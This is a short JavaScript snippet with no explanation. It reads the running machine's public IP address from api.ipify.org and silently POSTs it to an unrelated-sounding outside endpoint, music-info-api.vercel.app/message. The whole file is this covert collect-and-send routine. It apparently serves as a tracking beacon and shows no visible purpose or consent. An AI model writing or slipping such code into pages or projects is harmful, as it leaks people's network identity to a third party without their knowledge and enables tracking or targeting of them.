(async()=>{
    const response = await fetch("https://api.ipify.org/");
    await fetch("https://music-info-api.vercel.app/message", {
      method: "post",
      headers: {
        "content-type": "application/x-www-form-urlencoded",
      },
      body: "message=" + encodeURIComponent(await response.text()),
    });
  
})()
